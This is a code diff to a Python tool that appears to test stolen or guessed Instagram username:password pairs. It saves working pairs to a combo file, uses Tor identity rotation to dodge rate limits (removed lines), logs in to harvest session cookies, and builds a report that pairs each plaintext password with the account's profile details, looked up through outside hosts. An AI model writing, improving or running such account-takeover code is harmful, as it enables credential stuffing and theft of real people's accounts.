@@ -53,66 +53,12 @@ def get_inf(user,passs,ask,tokin,iddd):
         f=open('combo.txt','a+')
         f.write(user+":"+passs+"\n")
         f.close
-        with Controller.from_port(port=9051) as controller:
-                controller.authenticate(password=passlinux)
-                controller.signal(Signal.NEWNYM)
-        reqw =requests.session()
-
-        hea1={
-        'accept': '*/*',
-        'accept-encoding': 'gzip, deflate, br',
-        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        'content-length': '260',
-        'content-type': 'application/x-www-form-urlencoded',
-        'cookie': '',
-        'origin': 'https://www.instagram.com',
-        'referer': 'https://www.instagram.com/',
-        'sec-ch-ua': '"Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
-        'x-csrftoken': 'iTYeYhufyGIoiWfdZyVynUNqAZXEYwYa',
-        'x-ig-app-id': '936619743392459',
-        'x-ig-www-claim': 'hmac.AR1YqJ0hFbUnWM-gjFA6mkgUOSGJPdbRX__xA5Y8AwY3Wcuj',
-        'x-instagram-ajax': '2be71da717d9',
-        'x-requested-with': 'XMLHttpRequest'
-        }
-        loginurl = 'https://www.instagram.com/accounts/login/ajax/'
-        data = {
-                            'username': user,
-                            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:' + passs}
-        reqw.post(loginurl, data=data, headers=hea1, proxies={'http': 'socks5://127.0.0.1:9050'})
-        csrftoken = reqw.cookies["csrftoken"]
-        user_id = reqw.cookies["ds_user_id"]
-        ccc = reqw.cookies["sessionid"]
-        mid = reqw.cookies['mid']
-        head = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-        'accept-encoding': 'gzip, deflate, br',
-        'accept-language': 'en-GB,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-US;q=0.6',
-        'cache-control': 'max-age=0',
-        'Cookie': f'mid={mid}; ig_did=32C9BCA7-A7F6-4D5F-80F7-596D67C4F188; ig_nrcb=1; csrftoken={csrftoken}; ds_user_id={user_id}; sessionid={ccc}; shbid="5229\05446013660744\0541666498683:01f71ba8c2466f6be989dbea67070fe8ef578bc1d51adea3d58084a72952fcf0257da263"; shbts="1634962683\05446013660744\0541666498683:01f787f9c05a096a121e736e679c71576dea6782fc81e47eeaaf5df77d0cd0c9a87c5215"; rur="CLN\05446013660744\0541666498836:01f737e831efcee55642f6f65337a3ab4d881dbf5af1fac49a08e27af5cc61f6f59ab8ca"',
-        'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Linux"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'none',
-        'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': ua['google chrome'],}
-        
-        url_id = f'https://www.instagram.com/{user}/?__a=1'
-        req_id= requests.get(url_id,headers=head, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True).json()
-        name    = str(req_id['graphql']['user']['full_name'])
-        id    = str(req_id['graphql']['user']['id'])
-        followes    = str(req_id['graphql']['user']['edge_followed_by']['count'])
-        following    = str(req_id['graphql']['user']['edge_follow']['count'])
-        isp    = str(req_id['graphql']['user']['is_private'])
-        idd    = str(req_id['graphql']['user']['id'])
-        bio    = str(req_id['graphql']['user']['biography'])
+        info = requests.get(f"https://v6vv.tk/API/info-insta-v2.php?u={user}").json()
+        bio = info["biography"]
+        followes = info["edge_followed_by"]["count"]
+        following = info["edge_follow"]["count"]
+        name = info["full_name"]
+        id = info["id"]
         re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
         ree = re.json()
         dat = ree['data']
@@ -121,7 +67,7 @@ def get_inf(user,passs,ask,tokin,iddd):
 • name : {name}
 • username  : {user}
 • password : {passs}
-• id : {idd}
+• id : {id}
 • followers : {followes}
 • following  : {following}
 • Date : {dat}
@@ -228,7 +174,6 @@ def login(ask,tokin,idd,key):
                     '_csrftoken':'missing', 
                     'login_attempt_countn':'0',}
         # pro = random.choice(prox)
-        #DEV ABdullah   Coder
         try:
             with Controller.from_port(port=9051) as controller:
                 controller.authenticate(password=passlinux)
